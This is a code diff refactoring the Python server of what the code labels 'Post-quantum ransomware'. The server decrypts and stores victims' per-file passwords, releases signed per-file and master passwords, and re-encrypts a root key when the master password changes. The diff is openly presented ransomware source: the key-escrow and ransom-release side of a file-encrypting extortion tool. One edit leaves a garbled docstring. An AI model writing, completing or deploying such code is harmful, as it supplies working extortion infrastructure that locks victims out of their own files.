@@ -7,13 +7,14 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from pqcrypto.kem.ml_kem_1024 import decrypt
 from pqcrypto.sign.ml_dsa_87 import sign
 
-SALT_SIZE = 16  # Size of the salt for Argon2id
-IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
-TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
-KEY_SIZE = 32  # 256 bits for AES-256
+SALT_SIZE = 16  # Recommended salt size for Argon2id
+IV_SIZE = 12  # Recommended IV size for AES-GCM
+TAG_SIZE = 16  # Authentication tag size for AES-GCM
+KEY_SIZE = 32  # Key size for AES-256
 
 
 class Server:
+
     kem_secret_key: bytes
     sign_secret_key: bytes
     communication_key: bytes
@@ -21,7 +22,7 @@ class Server:
 
     def __init__(self, kem_secret_key: bytes, sign_secret_key: bytes):
         """
-        Initialize the Server with its KEM secret key and signing secret key.
+        Initialize the Server its KEM secret key and signing secret key.
 
         :param self: The Server instance.
         :param kem_secret_key: The server's KEM secret key.
@@ -59,7 +60,7 @@ class Server:
         hkdf = HKDF(
             algorithm=hashes.SHA256(),
             length=KEY_SIZE,
-            salt=None,
+            salt=None,  # RFC 5869
             info=b"Post-quantum ransomware communication key",
         )
 
@@ -109,36 +110,38 @@ class Server:
 
         return plaintext
 
-    def get_client_passwords(self, encrypted_data: bytes):
+    def store_client_passwords(self, client_data: bytes):
         """
-        Get client's files passwords.
+        Store client's files passwords.
 
         :param self: The Server instance.
-        :param encrypted_data: The encrypted passwords sent from the client.
+        :param client_data: The encrypted passwords sent by the client.
         :return: None
         """
 
-        iv = encrypted_data[:IV_SIZE]
-        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
-        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
+        # Decrypt the data sent by the client
+        iv = client_data[:IV_SIZE]
+        tag = client_data[IV_SIZE : IV_SIZE + TAG_SIZE]
+        ciphertext = client_data[IV_SIZE + TAG_SIZE :]
         files_passwords = self.decrypt(self.communication_key, iv, tag, ciphertext)
 
+        # Store the passwords
         self.client_passwords = files_passwords.decode("utf-8").splitlines()
 
-    def send_password(self, encrypted_data: bytes) -> bytes:
+    def send_password(self, client_data: bytes) -> tuple[bytes, bytes]:
         """
         Send the password for a specific file to the client.
 
         :param self: The Server instance.
-        :param encrypted_data: The encrypted file ID sent by the client.
+        :param client_data: The encrypted file ID sent by the client.
         :return: The encrypted file password to send to the client with its signature.
         :rtype: tuple[bytes, bytes]
         """
 
         # Decrypt the file ID sent by the client
-        iv = encrypted_data[:IV_SIZE]
-        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
-        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
+        iv = client_data[:IV_SIZE]
+        tag = client_data[IV_SIZE : IV_SIZE + TAG_SIZE]
+        ciphertext = client_data[IV_SIZE + TAG_SIZE :]
         file_id = self.decrypt(self.communication_key, iv, tag, ciphertext)
         file_id_int = int(file_id.decode("utf-8"))
 
@@ -165,7 +168,7 @@ class Server:
 
         return data, signature
 
-    def send_master_password(self) -> bytes:
+    def send_master_password(self) -> tuple[bytes, bytes]:
         """
         Send the master password to the client.
 
@@ -214,7 +217,7 @@ class Server:
 
         return password_key
 
-    def change_master_password(self, encrypted_data: bytes) -> bytes:
+    def change_master_password(self, encrypted_data: bytes) -> tuple[bytes, bytes]:
         """
         Change the master password for the client.
 
@@ -231,6 +234,8 @@ class Server:
         master_password_metadata = self.decrypt(
             self.communication_key, iv, tag, ciphertext
         )
+
+        # Parse the master password metadata
         master_password_salt = master_password_metadata[:SALT_SIZE]
         root_key_iv = master_password_metadata[SALT_SIZE : SALT_SIZE + IV_SIZE]
         root_key_tag = master_password_metadata[
@@ -247,26 +252,18 @@ class Server:
         master_password_key = self.derive_password_key(
             self.client_passwords[0], master_password_salt
         )
-        cipher = Cipher(
-            algorithms.AES(master_password_key),
-            modes.GCM(root_key_iv, root_key_tag),
+        root_key = self.decrypt(
+            master_password_key, root_key_iv, root_key_tag, root_key_ciphertext
         )
-        decryptor = cipher.decryptor()
-        root_key = decryptor.update(root_key_ciphertext) + decryptor.finalize()
 
         # Encrypt the root key with the new master password derived key
         new_master_password_salt = os.urandom(SALT_SIZE)
-        new_master_password_key = self.derive_password_key(
+        new_master_key = self.derive_password_key(
             new_master_password, new_master_password_salt
         )
-        new_root_key_iv = os.urandom(IV_SIZE)
-        cipher = Cipher(
-            algorithms.AES(new_master_password_key),
-            modes.GCM(new_root_key_iv),
+        new_root_key_iv, new_root_key_tag, new_root_key_ciphertext = self.encrypt(
+            new_master_key, root_key
         )
-        encryptor = cipher.encryptor()
-        new_root_key_ciphertext = encryptor.update(root_key) + encryptor.finalize()
-        new_root_key_tag = encryptor.tag
 
         # Update the stored master password
         self.client_passwords[0] = new_master_password
